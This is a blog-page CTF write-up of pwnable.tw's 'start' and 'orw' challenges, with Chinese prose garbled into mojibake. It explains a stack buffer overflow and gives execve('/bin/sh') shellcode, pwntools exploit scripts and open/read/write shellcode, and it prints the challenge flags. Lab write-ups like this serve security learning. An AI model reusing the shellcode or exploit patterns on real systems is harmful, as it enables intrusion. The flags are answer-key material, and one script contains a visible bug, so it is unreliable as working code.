<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"archive.next.arttnba3.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="0x00.ç»ªè®ºpwnable.twæ˜¯ä¸€ä¸ªä¸–ç•ŒèŒƒå›´å†…å¾ˆæœ‰åçš„pwné¢˜ç½‘ç«™ï¼Œä½œä¸ºä¸»æ”»pwnçš„CTFerï¼Œä¸Šé¢çš„é¢˜å¯¹æˆ‘è€Œè¨€è‡ªç„¶æ˜¯å¾ˆæœ‰å¿…è¦åšçš„ï¼ˆå½“ç„¶æˆ‘ç°åœ¨è¿˜å¤ªå¼±äº†XD ç‚¹å¼€æŸ¥çœ‹é¢˜è§£ğŸ‘‡ï¼ˆå½“ç„¶ä¹Ÿæœ‰å¯èƒ½æˆ‘æš‚æ—¶è¿˜ä¸€é¢˜éƒ½æ²¡æœ‰åšå‡ºæ¥2333  æ³¨ï¼šåŸé¢˜çš†å¯åœ¨æœ¬é¡µé¢ç›´æ¥ä¸‹è½½">
<meta property="og:type" content="article">
<meta property="og:title" content="ã€CTFé¢˜è§£-0x02ã€‘pwnable.tw write up by arttnb3">
<meta property="og:url" content="http://archive.next.arttnba3.cn/2020/08/17/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x02%E3%80%91pwnable-tw-write-up-by-arttnb3/index.html">
<meta property="og:site_name" content="arttnba3&#39;s blog">
<meta property="og:description" content="0x00.ç»ªè®ºpwnable.twæ˜¯ä¸€ä¸ªä¸–ç•ŒèŒƒå›´å†…å¾ˆæœ‰åçš„pwné¢˜ç½‘ç«™ï¼Œä½œä¸ºä¸»æ”»pwnçš„CTFerï¼Œä¸Šé¢çš„é¢˜å¯¹æˆ‘è€Œè¨€è‡ªç„¶æ˜¯å¾ˆæœ‰å¿…è¦åšçš„ï¼ˆå½“ç„¶æˆ‘ç°åœ¨è¿˜å¤ªå¼±äº†XD ç‚¹å¼€æŸ¥çœ‹é¢˜è§£ğŸ‘‡ï¼ˆå½“ç„¶ä¹Ÿæœ‰å¯èƒ½æˆ‘æš‚æ—¶è¿˜ä¸€é¢˜éƒ½æ²¡æœ‰åšå‡ºæ¥2333  æ³¨ï¼šåŸé¢˜çš†å¯åœ¨æœ¬é¡µé¢ç›´æ¥ä¸‹è½½">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2020/08/17/fFU9jXJR4NlxuGB.png">
<meta property="og:image" content="https://i.loli.net/2020/08/17/IGXgV5kZ1u3AL4E.png">
<meta property="og:image" content="https://i.loli.net/2020/08/17/ylLunQ8gIZpUVY9.png">
<meta property="og:image" content="https://i.loli.net/2020/08/17/lKcY7N8LV2fIB64.png">
<meta property="og:image" content="https://i.loli.net/2020/08/17/H6XJh48wE2bnMeT.png">
<meta property="og:image" content="https://i.loli.net/2020/08/17/H52G6MoufiUagpy.png">
<meta property="og:image" content="https://i.loli.net/2020/08/17/PYJNSMt7j8VF3ob.png">
<meta property="og:image" content="https://i.loli.net/2020/08/18/rY8vSGaO2R7Zu1W.png">
<meta property="og:image" content="https://i.loli.net/2020/08/31/39DbCjwxMeYLKry.png">
<meta property="og:image" content="https://i.loli.net/2020/08/31/pHOQYVeolKvJkxD.png">
<meta property="og:image" content="https://i.loli.net/2020/08/31/ZtL23IAugR61TzU.png">
<meta property="og:image" content="https://i.loli.net/2020/08/31/nlyewbocGB6zOrv.png">
<meta property="og:image" content="https://i.loli.net/2020/08/31/m6YRSEpJFk9wQCb.png">
<meta property="og:image" content="https://i.loli.net/2020/08/31/DF5AuyjdxZCQq9J.png">
<meta property="og:image" content="https://i.loli.net/2020/08/31/KYd5sUBSI8ODAtF.png">
<meta property="og:image" content="https://i.loli.net/2020/09/01/akJelDmdMbQY7Sx.png">
<meta property="og:image" content="https://i.loli.net/2020/09/01/bOtr7Lpmfc5iP4T.png">
<meta property="og:image" content="https://i.loli.net/2020/09/01/5ntsIupzL7iwby1.png">
<meta property="og:image" content="https://i.loli.net/2020/09/01/cIRm4X3OU7rJFiN.png">
<meta property="og:image" content="https://i.loli.net/2020/09/01/9d3aRTn4jyFxQsD.png">
<meta property="og:image" content="https://i.loli.net/2020/09/01/Keb5UGoVu4628fS.png">
<meta property="og:image" content="https://i.loli.net/2020/09/01/EC2X13BPOx9Lcme.png">
<meta property="og:image" content="https://i.loli.net/2020/09/01/vb3EIsGjnUu2xOp.png">
<meta property="og:image" content="https://i.loli.net/2020/09/01/Foe2MG9vdKczHY4.png">
<meta property="og:image" content="https://i.loli.net/2020/09/01/9jGflRnkt2e67JL.png">
<meta property="og:image" content="https://i.loli.net/2020/09/01/PhLB26KCVqea5Zj.png">
<meta property="article:published_time" content="2020-08-17T13:19:29.000Z">
<meta property="article:modified_time" content="2020-09-19T11:47:51.088Z">
<meta property="article:author" content="arttnba3">
<meta property="article:tag" content="ä¿¡æ¯å®‰å…¨">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="ret2shellcode">
<meta property="article:tag" content="python">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/08/17/fFU9jXJR4NlxuGB.png">

<link rel="canonical" href="http://archive.next.arttnba3.cn/2020/08/17/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x02%E3%80%91pwnable-tw-write-up-by-arttnb3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>ã€CTFé¢˜è§£-0x02ã€‘pwnable.tw write up by arttnb3 | arttnba3's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">arttnba3's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">- arttnba3çš„éšç§˜å°çª -</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/arttnba3" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://archive.next.arttnba3.cn/2020/08/17/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x02%E3%80%91pwnable-tw-write-up-by-arttnb3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="arttnba3">
      <meta itemprop="description" content="- åšäº†å…³äºä½ çš„æ¢¦ï¼Œæ‰€ä»¥ä¸æ„¿é†’æ¥å‘¢ -">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="arttnba3's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ã€CTFé¢˜è§£-0x02ã€‘pwnable.tw write up by arttnb3
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-08-17 21:19:29" itemprop="dateCreated datePublished" datetime="2020-08-17T21:19:29+08:00">2020-08-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-09-19 19:47:51" itemprop="dateModified" datetime="2020-09-19T19:47:51+08:00">2020-09-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="0x00-ç»ªè®º"><a href="#0x00-ç»ªè®º" class="headerlink" title="0x00.ç»ªè®º"></a>0x00.ç»ªè®º</h1><p><a href="https://pwnable.tw" target="_blank" rel="noopener">pwnable.tw</a>æ˜¯ä¸€ä¸ªä¸–ç•ŒèŒƒå›´å†…å¾ˆæœ‰åçš„pwné¢˜ç½‘ç«™ï¼Œä½œä¸ºä¸»æ”»pwnçš„CTFerï¼Œä¸Šé¢çš„é¢˜å¯¹æˆ‘è€Œè¨€è‡ªç„¶æ˜¯å¾ˆæœ‰å¿…è¦åšçš„ï¼ˆå½“ç„¶æˆ‘ç°åœ¨è¿˜å¤ªå¼±äº†XD</p>
<p>ç‚¹å¼€æŸ¥çœ‹é¢˜è§£ğŸ‘‡ï¼ˆ<del>å½“ç„¶ä¹Ÿæœ‰å¯èƒ½æˆ‘æš‚æ—¶è¿˜ä¸€é¢˜éƒ½æ²¡æœ‰åšå‡ºæ¥2333</del></p>
<blockquote>
<p>æ³¨ï¼šåŸé¢˜çš†å¯åœ¨æœ¬é¡µé¢ç›´æ¥ä¸‹è½½</p>
</blockquote>
<a id="more"></a>

<h1 id="0x01-start"><a href="#0x01-start" class="headerlink" title="0x01.start"></a>0x01.start</h1><blockquote>
<p> nc chall.pwnable.tw 10000</p>
</blockquote>
<p><a href="/download/pwnabletw/start" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-start</a> </p>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°ä¿æŠ¤å…¨å…³ï¼Œæš—ç¤ºå¯ä»¥ä¸ºæ‰€æ¬²ä¸º23333</p>
<p><img src="https://i.loli.net/2020/08/17/fFU9jXJR4NlxuGB.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œ<del>ç›´æ¥å‚»çœ¼ï¼Œè¿™éƒ½ä»€ä¹ˆä¸œè¥¿</del>ï¼Œæ•´ä¸ªç¨‹åºåªæœ‰ä¸€ä¸ª<code>_start</code>å‡½æ•°å’Œä¸€ä¸ª<code>_exit</code>å‡½æ•°</p>
<p><img src="https://i.loli.net/2020/08/17/IGXgV5kZ1u3AL4E.png" alt="image.png"></p>
<p>ç®€å•åˆ†æä¸€ä¸‹ï¼Œè¯¥ç¨‹åºé¦–å…ˆå°†<code>espçš„å€¼</code>ã€<code>_exitå‡½æ•°çš„åœ°å€</code>ä»¥åŠä¸€ä¸²å­—ç¬¦ä¸²<code>let&#39;s start the CTF</code>å‹å…¥æ ˆä¸­</p>
<p>éšåå°†espçš„å€¼ä¼ å…¥ecxå¯„å­˜å™¨ä¸­ï¼Œå°†0x14ä¼ å…¥dlå¯„å­˜å™¨ä¸­ï¼Œ1ä¼ å…¥blå¯„å­˜å™¨ä¸­ï¼Œ4ä¼ å…¥alå¯„å­˜å™¨ä¸­</p>
<p><strong>ä¹‹å<code>int 0x80</code>ä¸­æ–­æŒ‡ä»¤è§¦å‘Linuxç³»ç»Ÿè°ƒç”¨ï¼Œalå¯„å­˜å™¨çš„å€¼ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨äº†0x80ä¸­æ–­çš„ç³»ç»Ÿå‡½æ•°<code>sys_write()</code>ï¼Œå°†blã€dlã€ecxçš„å€¼ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œè¾“å‡ºå­—ç¬¦ä¸²</strong></p>
<p><strong>éšåå°†0x3cä¼ å…¥dlå¯„å­˜å™¨ä¸­ï¼Œ3ä¼ å…¥alå¯„å­˜å™¨ä¸­ï¼Œä¹‹å<code>int 0x80</code>ä¸­æ–­æŒ‡ä»¤è§¦å‘Linuxç³»ç»Ÿè°ƒç”¨ï¼Œalå¯„å­˜å™¨çš„å€¼ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨äº†0x80ä¸­æ–­çš„ç³»ç»Ÿå‡½æ•°<code>sys_read()</code>ï¼Œå°†blã€dlã€ecxçš„å€¼ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œè¯»å…¥æœ€å¤§0x3cä¸ªå­—èŠ‚</strong></p>
<p>æœ€åè¿”å›åˆ°<code>_exit</code>å‡½æ•°ï¼Œé€€å‡ºç¨‹åº</p>
<blockquote>
<p>å‚è§ï¼š<a href="http://asm.sourceforge.net/syscall.html" target="_blank" rel="noopener">linuxç³»ç»Ÿè°ƒç”¨</a></p>
</blockquote>
<p><img src="https://i.loli.net/2020/08/17/ylLunQ8gIZpUVY9.png" alt="image.png"></p>
<p>é‚£ä¹ˆåœ¨è¿™ä¸ªè¿‡ç¨‹å½“ä¸­ï¼Œ<strong><code>espä¸æ ˆ</code>çš„å˜åŒ–å¦‚ä¸‹</strong>ï¼ˆå­—ä¸‘å‹¿æ€ª2333ï¼ˆå›¾ä¸Šåº”è¯¥æ˜¯5æ¬¡pushï¼Œæ‰‹å¿«å†™é”™äº†XDDD</p>
<p><img src="https://i.loli.net/2020/08/17/lKcY7N8LV2fIB64.png" alt="image.png"></p>
<p>é€šè¿‡ä½¿ç”¨ä¸­æ–­çš„æ–¹å¼è°ƒç”¨ç³»ç»Ÿå‡½æ•°ï¼Œæˆ‘ä»¬ä¸éš¾çŒœçš„å‡ºè¿™åº”è¯¥æ˜¯ä¸€ä¸ªçº¯æ±‡ç¼–å†™çš„ç¨‹åº</p>
<p>ç¨‹åºæœ¬èº«ä¹Ÿæ²¡æœ‰å…¶ä»–å¤šä½™çš„gadgetsï¼Œåœ¨ä¿æŠ¤å…¨å…³çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘<strong>æ³„éœ²espçš„å€¼ï¼Œå°†shellcodeè¾“å…¥åˆ°æ ˆä¸Šï¼Œå†æ§åˆ¶ç¨‹åºè·³è½¬åˆ°æ ˆä¸Šçš„shellcodeä»¥getshell</strong></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è€ƒè™‘å…ˆè¦†ç›–æ‰return addressï¼Œæ§åˆ¶å…¶è·³è½¬è‡³<code>0x8048087</code>ï¼Œé‡æ–°è°ƒç”¨<code>sys_write()</code>è¾“å‡ºæ ˆä¸Šçš„å†…å®¹ï¼Œæ­¤æ—¶ç¨‹åºä¼šå°†<code>åŸespçš„å€¼</code>è¾“å‡ºå‡ºæ¥</p>
<p><img src="https://i.loli.net/2020/08/17/H6XJh48wE2bnMeT.png" alt="image.png"></p>
<p>éšåç¨‹åºæ¥ç€å¾€ä¸‹èµ°ï¼Œé‡æ–°è°ƒç”¨<code>sys_read()</code>ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥åœ¨è¿™é‡Œè¾“å…¥æˆ‘ä»¬çš„ç¬¬äºŒæ®µpayloadï¼š<strong>20*â€™Aâ€™ + é€šè¿‡æ³„éœ²çš„espçš„å€¼è®¡ç®—å‡ºæ¥çš„å­˜æ”¾shellcodeçš„æ ˆåœ°å€ + shellcode</strong>ï¼Œè¿™æ®µpayloadç”¨ä»¥getshell</p>
<p><img src="https://i.loli.net/2020/08/17/H52G6MoufiUagpy.png" alt="image.png"></p>
<p>ç®€å•åˆ†ææˆ‘ä»¬å¯ä»¥çŸ¥é“ç»è¿‡ç¬¬ä¸€æ¬¡è¾“å…¥åçš„è·³è½¬å†ç»è¿‡ç¬¬äºŒæ¬¡è¾“å…¥åï¼Œæ ˆä¸Š<code>åŸesp+0x14-4</code>çš„ä½ç½®å³æ˜¯ç¨‹åºæ§åˆ¶çš„è¿”å›åœ°å€ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨æ­¤å¤„å†™ä¸Š<code>åŸesp+0x14</code>ï¼Œç´§æ¥ç€åé¢è·Ÿç€è¦†ç›–ä¸Šæˆ‘ä»¬çš„shellcodeå³å¯getshellï¼Œæ•´ä¸ªè¿‡ç¨‹å¦‚ä¸‹å›¾</p>
<p><img src="https://i.loli.net/2020/08/17/PYJNSMt7j8VF3ob.png" alt="image.png"></p>
<p>å› ä¸ºè¾“å…¥åªæœ‰60ä¸ªå­—èŠ‚ï¼Œæ•…è€ƒè™‘ä½¿ç”¨11å·ä¸­æ–­è°ƒç”¨execve(â€œ/bin/shâ€)æ¥getshell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;!c</span><br><span class="line">;execve (&quot;&#x2F;bin&#x2F;sh&quot;) </span><br><span class="line">xor ecx, ecx</span><br><span class="line">mul ecx</span><br><span class="line">push ecx</span><br><span class="line">push 0x68732f2f   ;; hs&#x2F;&#x2F;</span><br><span class="line">push 0x6e69622f   ;; nib&#x2F;</span><br><span class="line">mov ebx, esp</span><br><span class="line">mov al, 11</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
<p>æ„é€ shellcodeå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æœ€åå¾—åˆ°çš„expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">write_addr = <span class="number">0x8048087</span></span><br><span class="line">shellcode = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./start'</span>)<span class="comment">#p = remote('chall.pwnable.tw',10000)</span></span><br><span class="line">payload1 = <span class="string">'A'</span>*<span class="number">0x14</span> + p32(write_addr)</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">esp_value = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">payload2 = <span class="string">'A'</span>*<span class="number">0x14</span> + (esp_value+<span class="number">0x14</span>) + shellcode<span class="comment">#æœ¬åœ°ä¸æ˜åŸå› ä¸€ç›´è·‘ä¸é€šx</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿æ¥ï¼Œå‘é€æˆ‘ä»¬çš„payloadï¼ŒæˆåŠŸå¾—åˆ°flagï¼ˆğŸ‘ˆå› ä¸ºç½‘ä¸å¥½è¿ç€è¯•äº†å¥½å‡ æ¬¡æ‰æˆåŠŸâ€¦</p>
<p><img src="https://i.loli.net/2020/08/18/rY8vSGaO2R7Zu1W.png" alt="image.png"></p>
<p>å¾—åˆ°flagï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Pwn4bl3_tW_1s_y0ur_st4rt&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x02-orw"><a href="#0x02-orw" class="headerlink" title="0x02.orw"></a>0x02.orw</h1><blockquote>
<p>nc chall.pwnable.tw 10001</p>
</blockquote>
<p><a href="/download/pwnabletw/orw/orw" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-orw</a> </p>
<p>é¦–å…ˆå¯ä»¥çœ‹åˆ°é¢˜ç›®å¯¹ç¯å¢ƒåšå‡ºäº†ä¸€å®šçš„é™åˆ¶</p>
<p><img src="https://i.loli.net/2020/08/31/39DbCjwxMeYLKry.png" alt="image.png"></p>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†<code>canary</code></p>
<p><img src="https://i.loli.net/2020/08/31/pHOQYVeolKvJkxD.png" alt="D_V73A_Y0XS1HEU~_CXRZSH.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/08/31/ZtL23IAugR61TzU.png" alt="image.png"></p>
<p>ä¸»ç¨‹åºä¸€å¼€å§‹ä¼šå…ˆè°ƒç”¨<code>orw_seccomp()</code>å‡½æ•°ï¼Œæˆ‘ä»¬ç‚¹è¿›å»åº·åº·</p>
<p><img src="https://i.loli.net/2020/08/31/nlyewbocGB6zOrv.png" alt="image.png"></p>
<p>v4æ˜¯canaryçš„å€¼ï¼Œæˆ‘ä»¬ç°åœ¨è¿˜ä¸çŸ¥é“æ˜¯å¦éœ€è¦ç»•è¿‡canaryï¼Œæ•…å…ˆä¸äºˆç†ä¼š</p>
<p>æ¥ä¸‹æ¥è°ƒç”¨äº†<code>qmemcpy()</code>å‡½æ•°ï¼Œå®é™…ä¸Šå°±æ˜¯<code>memcpy</code>å‡½æ•°ï¼Œå°†ä»0x8048640åœ°å€å¼€å§‹æ‹·è´0x60å­—èŠ‚çš„æ•°æ®åˆ°v3ä¸­ï¼Œéšåèµ‹å€¼12ç»™v1ï¼Œv2ä½œä¸ºæŒ‡é’ˆè·å–v3çš„é¦–å­—èŠ‚åœ°å€</p>
<p>æœ€åè°ƒç”¨<code>prctl()</code>å‡½æ•°ï¼Œç»“åˆé¢˜ç›®çš„è¯´æ˜ï¼Œæˆ‘ä»¬å¤§è‡´å¯ä»¥çŒœæµ‹åˆ°<code>orw_seccomp()</code>å‡½æ•°çš„ä½œç”¨åº”è¯¥æ˜¯<strong>ç¦ç”¨å…¶ä»–çš„ç³»ç»Ÿè°ƒç”¨ï¼Œä»…å¼€æ”¾sys_readã€sys_writeã€sys_open</strong></p>
<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬<strong>æ— æ³•é€šè¿‡sys_execveæ¥getshell</strong></p>
<p>æ¥ä¸‹æ¥å›åˆ°ä¸»å‡½æ•°ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“çœ‹å‡ºè¯¥ç¨‹åºä¼šè¯»å…¥æœ€å¤§0xC8å­—èŠ‚è¾“å…¥å¹¶å°è¯•æ‰§è¡Œè¯¥è¾“å…¥</p>
<p>ç»“åˆé¢˜ç›®è¯´æ˜ï¼Œæˆ‘ä»¬<strong>ä»…è€ƒè™‘æ„é€ shellcodeæ¥cat flag</strong></p>
<p>ï¼ˆå› ä¸ºè¦ç»•è¿‡seccompæ¥getshellå·²ç»æ˜¯kernel pwn çš„çº§åˆ«leï¼Œ233333ï¼‰</p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">shellcode &#x3D; &quot;&quot;</span><br><span class="line">shellcode +&#x3D; shellcraft.i386.pushstr(&quot;&#x2F;home&#x2F;orw&#x2F;flag&quot;)</span><br><span class="line">shellcode +&#x3D; shellcraft.i386.linux.syscall(&quot;SYS_open&quot;, &#39;esp&#39;)</span><br><span class="line">shellcode +&#x3D; shellcraft.i386.linux.syscall(&quot;SYS_read&quot;, &#39;eax&#39;, &#39;esp&#39;, 0x30)</span><br><span class="line">shellcode +&#x3D; shellcraft.i386.linux.syscall(&quot;SYS_write&quot;, 1, &#39;esp&#39;, 0x30)</span><br><span class="line">p &#x3D; remote(&#39;chall.pwnable.tw&#39;,10001)</span><br><span class="line">p.sendline(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>å‘æœåŠ¡å™¨å‘é€æˆ‘ä»¬çš„payload</p>
<p><img src="https://i.loli.net/2020/08/31/m6YRSEpJFk9wQCb.png" alt="_7__O90_E_I39_HGTFIP__S.png"></p>
<p>æˆåŠŸå¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;sh3llc0ding_w1th_op3n_r34d_writ3&#125;</span><br></pre></td></tr></table></figure>

